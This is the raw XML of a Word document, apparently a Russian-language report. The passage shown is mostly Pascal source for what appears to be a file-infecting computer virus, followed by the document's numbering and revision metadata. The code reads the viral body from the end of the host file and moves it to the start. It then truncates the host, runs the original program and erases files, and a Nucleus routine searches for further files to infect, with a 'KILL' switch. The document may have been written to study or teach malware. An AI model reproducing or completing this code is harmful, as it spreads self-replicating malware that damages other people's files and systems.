      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(0));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A00C02" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  reset(f,1</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0BF9AFC0" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  seek(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,filesize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f)-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>VirSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D81885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r w:rsidRPr="008231FF">
        <w:t>BlockRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,BufVir</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>,SizeOf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BufVir</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71314988" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  seek(f,0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0ADECE7C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r w:rsidRPr="008231FF">
        <w:t>BlockWrite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,BufVir</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>,NumRead</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20A42A10" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>FileSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f)&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>VirSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54EE786F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B8F253F" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Seek(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,FileSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f)-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>VirSize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D94C372" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Truncate(f); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">-6592); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F1AB2EB" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">    Close(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6E4EDEA6" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    if (Run=1) or (Run=3) then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62C07B1E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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>exec(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Paramstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(0),''); </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>BeginEnd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">(12716); </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D400EA2" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  end</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D7E236E" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  else</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B223736" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AACDD06" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Close(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="24A7F0D2" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    Erase(f</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="59CE6042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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Halt(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4FB81D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end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="56571F34" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6754F298" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">Procedure </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Nucleus;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="40EB8FDA" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>var</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27FA87D9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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve"> file;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="513A47A7" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43DBB7DF" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  Assign(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>f,paramstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(0));</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F29B68F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r w:rsidRPr="008231FF">
        <w:t>SetFAttr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(f,0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>);</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5E4D6FE7" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Paramstr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1)='KILL' then</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BCAD698" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9771B8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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>InRun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF253EB" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Halt(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>0);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8A416D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end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="28FCD162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gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Find(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>'');</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F96DD4" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>InRun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>1);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CF70D98" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>end;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="3CD1672C" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>begin</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="486FCC7D" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Randomize;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0404B885" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008231FF">
        <w:t>Nucleus;</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="44278961" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
      <w:r w:rsidRPr="008231FF">
        <w:t>end.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCE1785" w14:textId="77777777" w:rsidR="008231FF" w:rsidRPr="008231FF" w:rsidRDefault="008231FF" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D8937B0" w14:textId="7EEEBD15" w:rsidR="00601F8B" w:rsidRDefault="00601F8B" w:rsidP="008231FF">
      <w:pPr>
        <w:pStyle w:val="af"/>
      </w:pPr>
    </w:p>
    <w:sectPr w:rsidR="00601F8B" w:rsidSect="00D60F71">
      <w:footerReference w:type="default" r:id="rId42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2D1F6" w14:textId="77777777" w:rsidR="00395299" w:rsidRPr="00D60F71" w:rsidRDefault="00395299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4A6CBB74" w14:textId="77777777" w:rsidR="00395299" w:rsidRPr="00D60F71" w:rsidRDefault="00395299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DB0001A" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C53ADA" w:rsidRDefault="00C93DCC" w:rsidP="00C53ADA">
        <w:pPr>
          <w:pStyle w:val="afe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D740EB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  <w:p w14:paraId="2A77BE76" w14:textId="77777777" w:rsidR="007F4321" w:rsidRDefault="007F4321"/>
  <w:p w14:paraId="01540F04" w14:textId="77777777" w:rsidR="007F4321" w:rsidRDefault="007F4321"/>
  <w:p w14:paraId="0C0A76A2" w14:textId="77777777" w:rsidR="007F4321" w:rsidRDefault="007F43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A5AAD" w14:textId="77777777" w:rsidR="00395299" w:rsidRPr="00D60F71" w:rsidRDefault="00395299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0C753ED3" w14:textId="77777777" w:rsidR="00395299" w:rsidRPr="00D60F71" w:rsidRDefault="00395299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62FA7D24"/>
    <w:name w:val="WW8Num2"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="none"/>
      <w:pStyle w:val="a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1A715FA"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B2E811CC"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal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6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CC1AE9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="9" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="0CDD1E53"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1EE0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C750DE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="27D2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C17602A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="028E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0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D951AA5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B984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6" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="20906314"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="17" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="23A653BB"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="58C4C8F6"/>
    <w:lvl w:ilvl="0" w:tplc="FC8C2C18">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:pStyle w:val="a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2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9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20" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="35500D25"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6F544936"/>
    <w:numStyleLink w:val="22"/>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="21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2" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="443314AD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="458EEBE0"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a3"/>
      <w:suff w:val="space"/>
      <w:lvlText w:val="Рис.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4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D123824"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D9EAA19A"/>
    <w:lvl w:ilvl="0" w:tplc="25F0B318">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a4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09D27B7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="881A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7FC70B2"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="6F4C2824"/>
    <w:lvl w:ilvl="0" w:tplc="70526CC8">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a5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0" w15:restartNumberingAfterBreak="0">
    <w:nsid w:val="6E39556F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="90463F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FDA5BC5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BFD01092"/>
    <w:lvl w:ilvl="0">
      <w:start w:val="1"/>
      <w:numFmt w:val="decimal"/>
      <w:pStyle w:val="a6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3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524289913">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="1664166401">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1576697423">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="1117409170">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2111269361">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="2142308183">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1559511613">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="137691404">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="96105074">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="97724888">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="670719218">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="1063328686">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="641423271">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="2114671386">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="923803016">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="584724097">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="299380598">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1300382737">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1650865031">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="236210865">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="1982417804">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="676738853">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="455567023">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="182860818">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="490297892">
    <w:abstractNumId w:val="25"/>
    <w:lvlOverride w:ilvl="0">
      <w:startOverride w:val="1"/>
    </w:lvlOverride>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1932082204">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="840241912">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="2041276253">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="57737386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23951055">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="1446382390">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="18481786">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="512887499">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="129370674">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="1270503197">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="1539128446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removePersonalInformation/>
  <w:removeDateAndTime/>
  <w:proofState w:spelling="clean" w:grammar="clean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CDD"/>
    <w:rsid w:val="00025991"/>
    <w:rsid w:val="00035C4C"/>
    <w:rsid w:val="00036251"/>
    <w:rsid w:val="0003656F"/>
    <w:rsid w:val="00036C68"/>
    <w:rsid w:val="0006172D"/>
    <w:rsid w:val="00063A15"/>
    <w:rsid w:val="00064E8B"/>
    <w:rsid w:val="00090579"/>
    <w:rsid w:val="00095910"/>
    <w:rsid w:val="000B1F41"/>
    <w:rsid w:val="000B5D9C"/>
    <w:rsid w:val="000C6E86"/>
    <w:rsid w:val="000F71FD"/>
    <w:rsid w:val="001048A6"/>
    <w:rsid w:val="00111FF9"/>
    <w:rsid w:val="00144DA3"/>
    <w:rsid w:val="00151BEC"/>
    <w:rsid w:val="00162375"/>
    <w:rsid w:val="00182101"/>
    <w:rsid w:val="001832F5"/>
    <w:rsid w:val="001B1B03"/>
    <w:rsid w:val="001B32F7"/>
    <w:rsid w:val="001E64C6"/>
    <w:rsid w:val="001E6E38"/>
    <w:rsid w:val="0020070E"/>
    <w:rsid w:val="002170F2"/>
    <w:rsid w:val="00237987"/>
    <w:rsid w:val="002523D2"/>
    <w:rsid w:val="0025334A"/>
    <w:rsid w:val="002632D6"/>
    <w:rsid w:val="0029734A"/>
    <w:rsid w:val="002C0D96"/>
    <w:rsid w:val="002C64B8"/>
    <w:rsid w:val="002D1672"/>
    <w:rsid w:val="002D59E1"/>
    <w:rsid w:val="002D5C58"/>
    <w:rsid w:val="002E202B"/>
    <w:rsid w:val="002E373A"/>
    <w:rsid w:val="002E7750"/>
    <w:rsid w:val="0030071C"/>
    <w:rsid w:val="00312B77"/>
    <w:rsid w:val="00321776"/>
    <w:rsid w:val="00327A23"/>
    <w:rsid w:val="003354F8"/>
    <w:rsid w:val="003365E7"/>
    <w:rsid w:val="003402F7"/>
    <w:rsid w:val="00341A02"/>
    <w:rsid w:val="00371E39"/>
    <w:rsid w:val="0037417C"/>
    <w:rsid w:val="00374C59"/>
